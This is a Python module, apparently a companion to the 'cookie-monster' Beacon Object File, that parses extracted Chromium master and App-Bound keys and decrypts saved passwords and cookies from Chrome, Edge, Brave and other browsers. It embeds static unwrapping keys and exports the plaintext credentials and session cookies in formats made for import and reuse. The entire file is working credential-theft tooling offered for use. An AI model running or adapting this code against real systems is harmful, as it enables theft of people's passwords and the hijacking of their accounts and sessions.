"""Decode Chromium password/cookie databases using master keys from cookie-monster BOF."""
from __future__ import annotations

import base64
import datetime
import json
import re
import sqlite3
import struct
import tempfile
from dataclasses import dataclass
from typing import Optional

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305

# Chromium browser name → download file prefix mapping
BROWSER_FILE_PREFIX = {
    "chrome": "Chrome",
    "msedge": "Edge",
    "coccoc": "CocCoc",
    "brave": "Brave",
    "avast": "Avast",
}


@dataclass
class BrowserKeys:
    master_key: Optional[bytes] = None
    abe_key: Optional[bytes] = None


def parse_master_keys(bof_output: str) -> dict[str, BrowserKeys]:
    """Extract per-browser master keys and ABE keys from cookie-monster BOF output."""
    keys: dict[str, BrowserKeys] = {}
    current_browser: Optional[str] = None

    for line in bof_output.splitlines():
        m = re.search(r'Going for browser (\S+)', line)
        if m:
            current_browser = m.group(1).lower()
            if current_browser not in keys:
                keys[current_browser] = BrowserKeys()
            continue

        if not current_browser:
            continue

        m = re.search(r'Decrypted Master Key:\s*((?:\\x[0-9a-fA-F]{2})+)', line)
        if m:
            raw = bytes(int(h, 16) for h in re.findall(r'\\x([0-9a-fA-F]{2})', m.group(1)))
            keys[current_browser].master_key = raw
            continue

        m = re.search(r'Decrypted App Bound Key:\s*((?:\\x[0-9a-fA-F]{2})+)', line)
        if m:
            raw = bytes(int(h, 16) for h in re.findall(r'\\x([0-9a-fA-F]{2})', m.group(1)))
            keys[current_browser].abe_key = unwrap_abe_key(raw)

    return keys


# Static keys for unwrapping ABE key returned by IElevator (Chrome 127+)
_ABE_AES_KEY = base64.b64decode("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
_ABE_CHACHA_KEY = bytes.fromhex(
    "E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660"
)


def unwrap_abe_key(raw: bytes) -> bytes:
    """Unwrap ABE key blob from IElevator. If <= 32 bytes, use directly.
    If > 32 bytes, apply flag-based static key decryption (AES-GCM or ChaCha20-Poly1305)."""
    if len(raw) <= 32:
        return raw
    flag = raw[0]
    iv = raw[1:13]
    ct = raw[13:45]
    tag = raw[45:]
    if flag == 1:
        aes = AESGCM(_ABE_AES_KEY)
        return aes.decrypt(iv, ct + tag, None)
    elif flag == 2:
        cc = ChaCha20Poly1305(_ABE_CHACHA_KEY)
        return cc.decrypt(iv, ct + tag, None)
    elif flag == 3:
        # Flag 3 requires the browser's chrome-aes-key XOR'd with a static key.
        # Not yet supported — fall back to raw.
        return raw
    return raw


@dataclass
class DecryptStats:
    v10_ok: int = 0
    v20_ok: int = 0
    v10_fail: int = 0
    v20_fail: int = 0
    other: int = 0


def _aes_gcm_decrypt_no_verify(key: bytes, nonce: bytes, ciphertext: bytes) -> bytes:
    """AES-GCM decryption without tag verification (AES-CTR with GCM counter)."""
    # GCM uses CTR mode internally; data counter starts at nonce || 0x00000002
    counter_block = nonce + struct.pack(">I", 2)
    cipher = Cipher(algorithms.AES(key), modes.CTR(counter_block))
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()


def _decrypt_chromium_value(encrypted: bytes, key_v10: bytes, is_cookie: bool,
                            stats: Optional[DecryptStats] = None,
                            key_v20: Optional[bytes] = None) -> str:
    """Decrypt a Chromium AES-256-GCM encrypted value.

    v10 uses DPAPI master key. v20 uses ABE key (skipped if no ABE key).
    Format: 3-byte version + 12-byte nonce + ciphertext + 16-byte tag.
    Cookies have 32-byte padding prefix in plaintext that must be skipped.
    """
    if len(encrypted) < 3 + 12 + 16:
        if stats:
            stats.other += 1
        return ""

    version = encrypted[:3]
    if version not in (b"v10", b"v20"):
        if stats:
            stats.other += 1
        return ""

    if version == b"v20":
        if not key_v20:
            if stats:
                stats.v20_fail += 1
            return ""
        key = key_v20
    else:
        key = key_v10
    nonce = encrypted[3:15]
    ciphertext = encrypted[15:-16]  # strip 16-byte GCM tag

    try:
        plaintext = _aes_gcm_decrypt_no_verify(key, nonce, ciphertext)
        if is_cookie:
            plaintext = plaintext[32:]  # skip 32-byte padding
        result = plaintext.decode("utf-8", errors="replace")
        if stats:
            if version == b"v10":
                stats.v10_ok += 1
            else:
                stats.v20_ok += 1
        return result
    except Exception:
        if stats:
            if version == b"v10":
                stats.v10_fail += 1
            else:
                stats.v20_fail += 1
        return ""


def decode_passwords(db_content: bytes, bkeys: BrowserKeys) -> tuple[list[dict], DecryptStats]:
    """Decode a Chromium Login Data SQLite database."""
    results = []
    stats = DecryptStats()
    if not bkeys.master_key and not bkeys.abe_key:
        return results, stats
    v10_key = bkeys.master_key or b""
    v20_key = bkeys.abe_key
    with tempfile.NamedTemporaryFile(suffix=".db", delete=True) as tmp:
        tmp.write(db_content)
        tmp.flush()
        try:
            conn = sqlite3.connect(f"file:{tmp.name}?mode=ro", uri=True)
            conn.text_factory = bytes
            cur = conn.cursor()
            cur.execute(
                "SELECT origin_url, username_value, password_value "
                "FROM logins ORDER BY origin_url"
            )
            for row in cur.fetchall():
                url = row[0].decode("utf-8", errors="replace") if isinstance(row[0], bytes) else (row[0] or "")
                user = row[1].decode("utf-8", errors="replace") if isinstance(row[1], bytes) else (row[1] or "")
                pwd_enc = row[2] if isinstance(row[2], bytes) else b""
                pwd = _decrypt_chromium_value(
                    pwd_enc, v10_key, False, stats, key_v20=v20_key
                )
                if pwd:
                    results.append({
                        "url": url,
                        "username": user,
                        "password": pwd,
                    })
            conn.close()
        except Exception:
            pass
    return results, stats


def decode_cookies(db_content: bytes, bkeys: BrowserKeys) -> tuple[list[dict], DecryptStats]:
    """Decode a Chromium Cookies SQLite database."""
    results = []
    stats = DecryptStats()
    if not bkeys.master_key and not bkeys.abe_key:
        return results, stats
    v10_key = bkeys.master_key or b""
    v20_key = bkeys.abe_key
    with tempfile.NamedTemporaryFile(suffix=".db", delete=True) as tmp:
        tmp.write(db_content)
        tmp.flush()
        try:
            conn = sqlite3.connect(f"file:{tmp.name}?mode=ro", uri=True)
            conn.text_factory = bytes
            cur = conn.cursor()
            cur.execute(
                "SELECT host_key, name, encrypted_value, path, "
                "expires_utc, is_httponly, is_secure "
                "FROM cookies ORDER BY host_key, name"
            )
            for row in cur.fetchall():
                host = row[0].decode("utf-8", errors="replace") if isinstance(row[0], bytes) else (row[0] or "")
                name = row[1].decode("utf-8", errors="replace") if isinstance(row[1], bytes) else (row[1] or "")
                enc_val = row[2] if isinstance(row[2], bytes) else b""
                path = row[3].decode("utf-8", errors="replace") if isinstance(row[3], bytes) else (row[3] or "/")
                expires_utc = row[4] if isinstance(row[4], int) else 0
                is_httponly = row[5]
                is_secure = row[6]

                val = _decrypt_chromium_value(
                    enc_val, v10_key, True, stats, key_v20=v20_key
                )
                if val:
                    if expires_utc and expires_utc > 0:
                        epoch = datetime.datetime(1601, 1, 1)
                        try:
                            exp_dt = epoch + datetime.timedelta(microseconds=expires_utc)
                            exp_str = exp_dt.strftime("%Y-%m-%d %H:%M")
                        except (OverflowError, ValueError):
                            exp_str = str(expires_utc)
                    else:
                        exp_str = "session"

                    results.append({
                        "host": host,
                        "name": name,
                        "value": val,
                        "path": path,
                        "expires": exp_str,
                        "httponly": bool(is_httponly),
                        "secure": bool(is_secure),
                    })
            conn.close()
        except Exception:
            pass
    return results, stats


def format_passwords_txt(browser: str, passwords: list[dict], stats: DecryptStats) -> str:
    if not passwords:
        return ""
    lines = [f"=== {browser.upper()} PASSWORDS ({len(passwords)} decrypted, v10={stats.v10_ok} v20={stats.v20_ok}) ===\n"]
    for p in passwords:
        lines.append(f"URL:  {p['url']}")
        lines.append(f"User: {p['username']}")
        lines.append(f"Pass: {p['password']}")
        lines.append("")
    return "\n".join(lines)


def format_cookies_txt(browser: str, cookies: list[dict], stats: DecryptStats) -> str:
    if not cookies:
        return ""
    lines = [f"=== {browser.upper()} COOKIES ({len(cookies)} decrypted, v10={stats.v10_ok} v20={stats.v20_ok}) ===\n"]
    for c in cookies:
        flags = []
        if c["httponly"]:
            flags.append("HttpOnly")
        if c["secure"]:
            flags.append("Secure")
        flag_str = f" [{','.join(flags)}]" if flags else ""
        lines.append(f"{c['host']}\t{c['name']}={c['value']}\t{c['path']}\texp={c['expires']}{flag_str}")
    lines.append("")
    return "\n".join(lines)


def format_cookies_json(browser: str, cookies: list[dict], stats: DecryptStats) -> list[dict]:
    """Return cookies as a list of dicts suitable for JSON serialization (Cookie-Editor format)."""
    result = []
    for c in cookies:
        exp_ts = 0
        if c["expires"] != "session":
            try:
                dt = datetime.datetime.strptime(c["expires"], "%Y-%m-%d %H:%M")
                exp_ts = int(dt.timestamp())
            except Exception:
                exp_ts = 0
        result.append({
            "domain": c["host"],
            "name": c["name"],
            "value": c["value"],
            "path": c["path"],
            "expirationDate": exp_ts,
            "httpOnly": c["httponly"],
            "secure": c["secure"],
            "session": c["expires"] == "session",
        })
    return result


def format_cookies_netscape(browser: str, cookies: list[dict]) -> str:
    if not cookies:
        return ""
    lines = [f"# {browser.upper()} Cookies - Netscape format"]
    lines.append("# Import with curl --cookie or browser extensions\n")
    for c in cookies:
        httponly_prefix = "#HttpOnly_" if c["httponly"] else ""
        host = c["host"]
        domain_flag = "TRUE" if host.startswith(".") else "FALSE"
        secure = "TRUE" if c["secure"] else "FALSE"
        exp = "0"
        if c["expires"] != "session":
            try:
                dt = datetime.datetime.strptime(c["expires"], "%Y-%m-%d %H:%M")
                exp = str(int(dt.timestamp()))
            except Exception:
                exp = "0"
        lines.append(f"{httponly_prefix}{host}\t{domain_flag}\t{c['path']}\t{secure}\t{exp}\t{c['name']}\t{c['value']}")
    lines.append("")
    return "\n".join(lines)
